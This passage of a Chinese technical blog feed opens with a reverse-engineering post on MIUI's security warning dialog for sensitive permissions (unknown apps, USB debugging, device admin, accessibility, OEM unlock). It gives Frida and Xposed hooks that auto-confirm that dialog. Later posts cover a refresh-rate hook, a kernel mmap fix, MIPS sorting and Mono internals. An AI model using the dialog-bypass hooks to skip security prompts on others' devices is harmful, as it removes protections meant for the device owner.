<h3 id="快速定位"><a href="#快速定位" class="headerlink" title="快速定位"></a>快速定位</h3><p>搜索<code>SpecialPermissionInterceptActivity</code>类，定位到判断函数（开头调用<code>getStringExtra(&quot;permName&quot;)</code>）。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">r</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v0 = d.a(((Activity)<span class="keyword">this</span>).getIntent().getStringExtra(<span class="string">&quot;permName&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span>(v0 == -<span class="number">1</span>) &#123;</span><br><span class="line">        ((Activity)<span class="keyword">this</span>).finish();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    t v1 = <span class="keyword">this</span>.getSupportFragmentManager().b();</span><br><span class="line">    g v0_1 = d.c(v0) ? g.a(((Activity)<span class="keyword">this</span>).getIntent()) : h.a(((Activity)<span class="keyword">this</span>).getIntent());</span><br><span class="line">    v1.b(<span class="number">0x1020002</span>, v0_1);</span><br><span class="line">    v1.b();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>进入三元运算符的返回值类<code>g v0_1</code>，查看其父类<code>f</code>，搜索<code>setOnClickListener</code>，该函数即为Hook点（<code>n</code>）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">n</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Button v0 = <span class="keyword">this</span>.btnConfirm;</span><br><span class="line">    <span class="keyword">if</span>(v0 != <span class="keyword">null</span>) &#123;</span><br><span class="line">        v0.setOnClickListener(<span class="keyword">this</span>.e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Button v0_1 = <span class="keyword">this</span>.c;</span><br><span class="line">    <span class="keyword">if</span>(v0_1 != <span class="keyword">null</span>) &#123;</span><br><span class="line">        v0_1.setOnClickListener(<span class="keyword">this</span>.e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看<code>this.e</code>的实现代码，即可找到主动调用函数名（<code>d</code>）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span>  <span class="comment">// android.view.View$OnClickListener</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg3)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> v0;</span><br><span class="line">    f v3;</span><br><span class="line">    <span class="keyword">if</span>(arg3.getId() == <span class="number">0x7F0B041A</span>) &#123;</span><br><span class="line">        v3 = <span class="keyword">this</span>.a;</span><br><span class="line">        v0 = <span class="keyword">true</span>;</span><br><span class="line">        v3.d(v0);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(arg3.getId() == <span class="number">0x7F0B041E</span>) &#123;</span><br><span class="line">        v3 = <span class="keyword">this</span>.a;</span><br><span class="line">        v0 = <span class="keyword">false</span>;</span><br><span class="line">        v3.d(v0);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.a.h(arg3.getId());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Frida脚本"><a href="#Frida脚本" class="headerlink" title="Frida脚本"></a>Frida脚本</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.use(<span class="string">&quot;com.miui.permcenter.privacymanager.f&quot;</span>).n.overload()</span><br><span class="line">        .implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.d(<span class="literal">true</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="分析5-4-0"><a href="#分析5-4-0" class="headerlink" title="分析5.4.0"></a>分析5.4.0</h2><p>从<code>/system/priv-app/SecurityCenter/</code>提取手机管家apk（版本号<code>5.4.0</code>），使用JEB打开，定位到该Activity：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        Window window = <span class="keyword">this</span>.getWindow();</span><br><span class="line">        window.setBackgroundDrawable(<span class="keyword">new</span> ColorDrawable(<span class="keyword">this</span>.getResources().getColor(<span class="number">0x7F060599</span>)));</span><br><span class="line">        window.setLayout(-<span class="number">1</span>, -<span class="number">1</span>);</span><br><span class="line">        window.addFlags(<span class="number">4</span>);</span><br><span class="line">        <span class="keyword">this</span>.a();</span><br><span class="line">        <span class="keyword">this</span>.b();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h3><p><code>a</code>函数反射调用<code>setNavigationBarColor</code>，设置导航栏颜色<br><code>b</code>函数根据<code>permName</code>的值，显示不同的窗口（-1则直接退出）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">b</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> permName = c.a(<span class="keyword">this</span>.getIntent().getStringExtra(<span class="string">&quot;permName&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span>(permName == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.finish();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FragmentTransaction fragmentTransaction = <span class="keyword">this</span>.getFragmentManager().beginTransaction();</span><br><span class="line">    e fragment = c.gt5(permName) ? e.a(<span class="keyword">this</span>.getIntent()) : f.a(<span class="keyword">this</span>.getIntent());</span><br><span class="line">    fragmentTransaction.replace(<span class="number">0x1020002</span>, ((Fragment)fragment));</span><br><span class="line">    fragmentTransaction.commitAllowingStateLoss();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看<code>com.miui.permcenter.privacymanager.m.c</code>类，其中包含权限数组：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">c.d = Arrays.asList(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;perm_notification&quot;</span>, <span class="string">&quot;perm_install_unknown&quot;</span>, <span class="string">&quot;perm_app_statistics&quot;</span>, <span class="string">&quot;perm_device_manager&quot;</span>, <span class="string">&quot;miui_open_debug&quot;</span>, <span class="string">&quot;miui_barrier_free&quot;</span>, <span class="string">&quot;miui_close_optimization&quot;</span>, <span class="string">&quot;oaid_close&quot;</span>&#125;);</span><br></pre></td></tr></table></figure>
<p>可得到以下对应关系：</p>
<table>
<thead>
<tr>
<th>permName</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>通知使用权</td>
</tr>
<tr>
<td>1</td>
<td>安装未知应用</td>
</tr>
<tr>
<td>2</td>
<td>使用情况访问权限</td>
</tr>
<tr>
<td>3</td>
<td>设备管理应用</td>
</tr>
<tr>
<td>4</td>
<td>打开USB调试模式</td>
</tr>
<tr>
<td>5</td>
<td>无障碍功能</td>
</tr>
<tr>
<td>6</td>
<td>关闭MIUI优化</td>
</tr>
<tr>
<td>7</td>
<td>开启OEM解锁</td>
</tr>
</tbody></table>
<h3 id="核心函数"><a href="#核心函数" class="headerlink" title="核心函数"></a>核心函数</h3><p>查看<code>f.a</code>函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> f <span class="title">a</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">    f fragment = <span class="keyword">new</span> f();</span><br><span class="line">    Bundle bundle = <span class="keyword">new</span> Bundle();</span><br><span class="line">    <span class="keyword">if</span>(intent != <span class="keyword">null</span>) &#123;</span><br><span class="line">        bundle.putString(<span class="string">&quot;permName&quot;</span>, intent.getStringExtra(<span class="string">&quot;permName&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fragment.setArguments(bundle);</span><br><span class="line">    <span class="keyword">return</span> fragment;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>f</code>类继承自<code>d</code>类，且在<code>c</code>函数中设置了按钮的<code>OnClickListener</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> View.OnClickListener e;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">d</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.e = <span class="keyword">new</span> d.a(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">c</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Button btnConfirm = <span class="keyword">this</span>.b;</span><br><span class="line">    <span class="keyword">if</span>(btnConfirm != <span class="keyword">null</span>) &#123;</span><br><span class="line">        btnConfirm.setOnClickListener(<span class="keyword">this</span>.e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Button btnCancel = <span class="keyword">this</span>.c;</span><br><span class="line">    <span class="keyword">if</span>(btnCancel != <span class="keyword">null</span>) &#123;</span><br><span class="line">        btnCancel.setOnClickListener(<span class="keyword">this</span>.e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看<code>com.miui.permcenter.privacymanager.d$a</code>的<code>onClick</code>函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> v0;</span><br><span class="line">    d fragment;</span><br><span class="line">    <span class="keyword">if</span>(view.getId() == <span class="number">0x7F0B03F9</span>) &#123;</span><br><span class="line">        fragment = <span class="keyword">this</span>.a;</span><br><span class="line">        v0 = <span class="keyword">true</span>;</span><br><span class="line">        fragment.a(v0);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(view.getId() == <span class="number">0x7F0B03FD</span>) &#123;</span><br><span class="line">        fragment = <span class="keyword">this</span>.a;</span><br><span class="line">        v0 = <span class="keyword">false</span>;</span><br><span class="line">        fragment.a(v0);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.a.b(view.getId());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>判断点击的按钮是确认还是取消，最终调用<code>a</code>函数，确认传入<code>true</code>，取消传入<code>false</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">(<span class="keyword">boolean</span> flag)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.getActivity().setResult(flag ? -<span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">this</span>.getActivity().finish();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>Hook <code>com.miui.permcenter.privacymanager.d.c</code>函数（即设置<code>OnClickListener</code>的函数），替换其实现，直接调用<code>a</code>函数，传入<code>true</code>即可</p>
<h3 id="Frida"><a href="#Frida" class="headerlink" title="Frida"></a>Frida</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.use(<span class="string">&quot;com.miui.permcenter.privacymanager.d&quot;</span>).c.overload()</span><br><span class="line">        .implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.a(<span class="literal">true</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h3 id="Xposed"><a href="#Xposed" class="headerlink" title="Xposed"></a>Xposed</h3><p>反射调用<code>a</code>函数即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">findAndHookMethod(<span class="string">&quot;com.miui.permcenter.privacymanager.d&quot;</span>, lpparam.classLoader, <span class="string">&quot;c&quot;</span>, <span class="keyword">new</span> XC_MethodReplacement() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">replaceHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        Method mtdA = param.thisObject.getClass().getDeclaredMethod(<span class="string">&quot;a&quot;</span>, <span class="keyword">boolean</span>.class);</span><br><span class="line">        mtdA.invoke(param.thisObject, <span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.52pojie.cn/thread-675777-1-1.html">MIUI9绕开联网和插卡打开未知来源</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Xposed实现MIUI 12全局高刷</title>
    <url>/2022/05/26/miui-powerkeeper-bypass/</url>
    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p>完整项目见<a href="https://github.com/XhyEax/MIUICustom">MIUICustom</a></p>
<p>注意：该模块仅测试于<code>电池与性能</code> <code>4.2.00</code>，其他版本未测试。</p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>即使在设置中将屏幕刷新率设置为120Hz，对于某些应用（如哔哩哔哩）仍锁60帧。<br>通过<code>Xposed</code> Hook <code>DisplayFrameSetting.isFeatureOn</code>，实现全局高刷。</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 4.2.00</span></span><br><span class="line">Method mtd_isFeatureOn_4200 = XposedHelpers.findMethodExactIfExists(<span class="string">&quot;com.miui.powerkeeper.statemachine.DisplayFrameSetting&quot;</span>,</span><br><span class="line">        lpparam.classLoader, <span class="string">&quot;isFeatureOn&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (mtd_isFeatureOn_4200 != <span class="keyword">null</span>) &#123;</span><br><span class="line">    XposedBridge.hookMethod(mtd_isFeatureOn_4200, <span class="keyword">new</span> XC_MethodReplacement() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> Object <span class="title">replaceHookedMethod</span><span class="params">(MethodHookParam param)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>打开<code>设置</code>-<code>开发者选项</code>-<code>显示刷新频率</code></p>
<ol>
<li>打开哔哩哔哩，帧率为60。</li>
<li>在<code>LSPosed</code>钟对<code>电池与性能</code>启动模块，并强行停止（长按）。</li>
<li>打开哔哩哔哩，帧率为120。</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.bilibili.com/video/BV18i4y1S7FU">[教程] MIUI 修改 反编译 全局高刷 教程</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>修复内核驱动 mmap 4K对齐问题</title>
    <url>/2022/05/07/mmap-page-4k-align/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>编写内核驱动，使用<code>mmap</code>共享内存。发现读取到的数据不对。<br>联想到<code>mmap</code>的<code>length</code>会自动调整为<code>PAGE_SIZE</code>的倍数，猜测是因为<code>mmap</code>返回的是对应<code>page</code>的起始地址，导致存在偏移。</p>
<p>修复方式：初始化时，单独申请一块大小为<code>PAGE_SIZE</code>的内存，不使用数组。<br>并调用<code>SetPageReserved</code>，保留该页。</p>
<span id="more"></span>
<h2 id="问题代码"><a href="#问题代码" class="headerlink" title="问题代码"></a>问题代码</h2><h3 id="内核驱动"><a href="#内核驱动" class="headerlink" title="内核驱动"></a>内核驱动</h3><h4 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ShareData</span>&#123;</span></span><br><span class="line"><span class="keyword">bool</span> isCompleted;</span><br><span class="line"><span class="keyword">int</span> data[<span class="number">20</span>];</span><br><span class="line">&#125;</span><br><span class="line">ShareData * g_ShareData;</span><br></pre></td></tr></table></figure>
<h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">g_ShareData = <span class="built_in">kmalloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(struct ShareData), GFP_KERNEL);</span><br></pre></td></tr></table></figure>
<h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">remap_pfn_range</span>(vma, vma-&gt;vm_start, <span class="built_in">virt_to_phys</span>(g_ShareData-&gt;data) &gt;&gt; PAGE_SHIFT,</span><br><span class="line">vma-&gt;vm_end - vma-&gt;vm_start, vma-&gt;vm_page_prot)) &#123;</span><br><span class="line">    <span class="keyword">return</span>  -EAGAIN;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">int</span> *) data_mapped = (<span class="keyword">int</span> *)<span class="built_in">mmap</span>(<span class="number">0</span>, <span class="number">4096</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>计算偏移值：<code>offset = (uint64_t)g_ShareData-&gt;data % PAGE_SIZE</code></p>
<p>加上该偏移值后，读取<code>data_mapped + offset/4</code>，发现确实是要读取的数据。</p>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><h4 id="结构体-1"><a href="#结构体-1" class="headerlink" title="结构体"></a>结构体</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ShareData</span>&#123;</span></span><br><span class="line"><span class="keyword">bool</span> isCompleted;</span><br><span class="line"><span class="keyword">int</span>* data;</span><br><span class="line">&#125;</span><br><span class="line">ShareData * g_ShareData;</span><br></pre></td></tr></table></figure>
<h4 id="初始化-1"><a href="#初始化-1" class="headerlink" title="初始化"></a>初始化</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">g_ShareData = <span class="built_in">kmalloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(struct ShareData), GFP_KERNEL);</span><br><span class="line">g_ShareData-&gt;data = <span class="built_in">kmalloc</span>(PAGE_SIZE, GFP_KERNEL);</span><br><span class="line"><span class="built_in">SetPageReserved</span>(<span class="built_in">virt_to_page</span>(g_ShareData-&gt;data));</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/shallnet/article/details/47903163">例说linux内核与应用数据通信（四）：映射设备内核空间到用户态</a><br><a href="https://github.com/jasonblog/note/blob/master/linux_kernel/src/%E4%BE%8B%E8%AA%AA%E6%A0%B8%E5%BF%83%E5%B1%A4%E8%88%87%E4%BD%BF%E7%94%A8%E5%B1%A4%E9%80%9A%E8%A8%8A/4_memdev/drv/chr_memdev.c">例說核心層與使用層通訊/4_memdev/drv/chr_memdev.c</a><br><a href="https://github.com/jasonblog/note/blob/master/blog/jin-yang.github.com/examples/examples/linux/memory/mmap/kernel/hello.c">linux/memory/mmap/kernel/hello.c</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>Kernel</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>MIPS冒泡排序 计算机组成原理与设计（第五版）</title>
    <url>/2020/03/28/mips-bubble-sort/</url>
    <content><![CDATA[<h2 id="代码如下"><a href="#代码如下" class="headerlink" title="代码如下"></a>代码如下</h2><p>（非递减排序）</p>
<figure class="highlight mips"><table><tr><td class="code"><pre><span class="line"><span class="symbol">sort:</span><span class="keyword">addi </span>$<span class="built_in">sp</span>,$<span class="built_in">sp</span>,-<span class="number">20</span></span><br><span class="line"><span class="keyword">sw </span>$<span class="built_in">ra</span>,<span class="number">16</span>($<span class="built_in">sp</span>)</span><br><span class="line"><span class="keyword">sw </span>$<span class="built_in">s3</span>,<span class="number">12</span>($<span class="built_in">sp</span>)</span><br><span class="line"><span class="keyword">sw </span>$<span class="built_in">s2</span>,<span class="number">8</span>($<span class="built_in">sp</span>)</span><br><span class="line"><span class="keyword">sw </span>$<span class="built_in">s1</span>,<span class="number">4</span>($<span class="built_in">sp</span>)</span><br><span class="line"><span class="keyword">sw </span>$<span class="built_in">s0</span>,<span class="number">0</span>($<span class="built_in">sp</span>)</span><br><span class="line"><span class="keyword">move </span>$<span class="built_in">s2</span>,$<span class="built_in">a0</span></span><br><span class="line"><span class="keyword">move </span>$<span class="built_in">s3</span>,$<span class="built_in">a1</span></span><br><span class="line"><span class="keyword">move </span>$<span class="built_in">s0</span>,$<span class="built_in">zero</span></span><br><span class="line"><span class="symbol">for1tst:</span><span class="keyword">slt </span>$<span class="built_in">t0</span>,$<span class="built_in">s0</span>,$<span class="built_in">s3</span></span><br><span class="line"><span class="keyword">beq </span>$<span class="built_in">t0</span>,$<span class="built_in">zero</span>,exit1</span><br><span class="line"><span class="keyword">addi </span>$<span class="built_in">s1</span>,$<span class="built_in">s0</span>,-<span class="number">1</span></span><br><span class="line"><span class="symbol">for2tst:</span><span class="keyword">slti </span>$<span class="built_in">t0</span>,$<span class="built_in">s1</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">bne </span>$<span class="built_in">t0</span>,$<span class="built_in">zero</span>,exit2</span><br><span class="line"><span class="keyword">sll </span>$<span class="built_in">t1</span>,$<span class="built_in">s1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">add </span>$<span class="built_in">t2</span>,$<span class="built_in">s2</span>,$<span class="built_in">t1</span></span><br><span class="line"><span class="keyword">lw </span>$<span class="built_in">t3</span>,<span class="number">0</span>($<span class="built_in">t2</span>)</span><br><span class="line"><span class="keyword">lw </span>$<span class="built_in">t4</span>,<span class="number">4</span>($<span class="built_in">t2</span>)</span><br><span class="line"><span class="keyword">slt </span>$<span class="built_in">t0</span>,$<span class="built_in">t4</span>,$<span class="built_in">t3</span></span><br><span class="line"><span class="keyword">beq </span>$<span class="built_in">t0</span>,$<span class="built_in">zero</span>,exit2</span><br><span class="line"><span class="keyword">move </span>$<span class="built_in">a0</span>,$<span class="built_in">s2</span></span><br><span class="line"><span class="keyword">move </span>$<span class="built_in">a1</span>,$<span class="built_in">s1</span></span><br><span class="line"><span class="keyword">jal </span><span class="keyword">swap</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">addi </span>$<span class="built_in">s1</span>,$<span class="built_in">s1</span>,-<span class="number">1</span></span><br><span class="line"><span class="keyword">j </span>for2tst</span><br><span class="line"><span class="symbol">exit2:</span><span class="keyword">addi </span>$<span class="built_in">s0</span>,$<span class="built_in">s0</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">j </span>for1tst</span><br><span class="line"><span class="symbol">exit1:</span><span class="keyword">lw </span>$<span class="built_in">s0</span>,<span class="number">0</span>($<span class="built_in">sp</span>)</span><br><span class="line"><span class="keyword">lw </span>$<span class="built_in">s1</span>,<span class="number">4</span>($<span class="built_in">sp</span>)</span><br><span class="line"><span class="keyword">lw </span>$<span class="built_in">s2</span>,<span class="number">8</span>($<span class="built_in">sp</span>)</span><br><span class="line"><span class="keyword">lw </span>$<span class="built_in">s3</span>,<span class="number">12</span>($<span class="built_in">sp</span>)</span><br><span class="line"><span class="keyword">lw </span>$<span class="built_in">ra</span>,<span class="number">16</span>($<span class="built_in">sp</span>)</span><br><span class="line"><span class="keyword">addi </span>$<span class="built_in">sp</span>,$<span class="built_in">sp</span>,<span class="number">20</span></span><br><span class="line"><span class="keyword">jr </span>$<span class="built_in">ra</span></span><br><span class="line"><span class="keyword">swap: </span><span class="keyword">sll </span>$<span class="built_in">t1</span>,$<span class="built_in">a1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">add </span>$<span class="built_in">t1</span>,$<span class="built_in">a0</span>,$<span class="built_in">t1</span></span><br><span class="line"><span class="keyword">lw </span>$<span class="built_in">t0</span>,<span class="number">0</span>($<span class="built_in">t1</span>)</span><br><span class="line"><span class="keyword">lw </span>$<span class="built_in">t2</span>,<span class="number">4</span>($<span class="built_in">t1</span>)</span><br><span class="line"><span class="keyword">sw </span>$<span class="built_in">t2</span>,<span class="number">0</span>($<span class="built_in">t1</span>)</span><br><span class="line"><span class="keyword">sw </span>$<span class="built_in">t0</span>,<span class="number">4</span>($<span class="built_in">t1</span>)</span><br><span class="line"><span class="keyword">jr </span>$<span class="built_in">ra</span></span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>计算机组成原理与设计（第五版） 机械工业出版社 第94页</p>
]]></content>
      <tags>
        <tag>MIPS</tag>
      </tags>
  </entry>
  <entry>
    <title>Mono RuntimeMethodHandle GetFunctionPointer 源码分析</title>
    <url>/2022/05/12/mono-runtimemethodhandle-getfunctionpointer-analysis/</url>
    <content><![CDATA[<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最终调用<code>mono_jit_compile_method_with_opt</code>，使用JIT对方法进行编译优化，返回JIT方法指针。</p>
<span id="more"></span>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><h3 id="CSharp函数声明"><a href="#CSharp函数声明" class="headerlink" title="CSharp函数声明"></a>CSharp函数声明</h3><p><a href="https://github.com/mono/mono/blob/5d2e3bc3b3c8184d35b2f7801e88d96470d367c4/mcs/class/corlib/System/RuntimeMethodHandle.cs#L81">RuntimeMethodHandle.cs#L81</a></p>
<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line">[<span class="meta">MethodImpl (MethodImplOptions.InternalCall)</span>]</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">GetFunctionPointer</span> (<span class="params">IntPtr m</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> IntPtr <span class="title">GetFunctionPointer</span> (<span class="params"></span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> GetFunctionPointer (<span class="keyword">value</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>声明为<code>MethodImplOptions.InternalCall</code></p>
<h3 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h3><p><a href="https://github.com/mono/mono/blob/5d2e3bc3b3c8184d35b2f7801e88d96470d367c4/mono/metadata/icall-def-netcore.h#L387">icall-def-netcore.h#L387</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">HANDLES</span>(MHAN_1, <span class="string">&quot;GetFunctionPointer&quot;</span>, ves_icall_RuntimeMethodHandle_GetFunctionPointer, gpointer, <span class="number">1</span>, (MonoMethod_ptr))</span><br></pre></td></tr></table></figure>

<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p><a href="https://github.com/mono/mono/blob/5d2e3bc3b3c8184d35b2f7801e88d96470d367c4/mono/metadata/icall.c#L7768">icall.c#L7768</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">gpointer</span></span><br><span class="line"><span class="function"><span class="title">ves_icall_RuntimeMethodHandle_GetFunctionPointer</span> <span class="params">(MonoMethod *method, MonoError *error)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">mono_compile_method_checked</span> (method, error);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="mono-compile-method-checked"><a href="#mono-compile-method-checked" class="headerlink" title="mono_compile_method_checked"></a>mono_compile_method_checked</h3><h4 id="声明-1"><a href="#声明-1" class="headerlink" title="声明"></a>声明</h4><p><a href="https://github.com/mono/mono/blob/5d2e3bc3b3c8184d35b2f7801e88d96470d367c4/mono/metadata/object-internals.h#L2128">object-internals.h#L2128</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>* </span></span><br><span class="line"><span class="function"><span class="title">mono_compile_method_checked</span> <span class="params">(MonoMethod *method, MonoError *error)</span></span>;</span><br></pre></td></tr></table></figure>
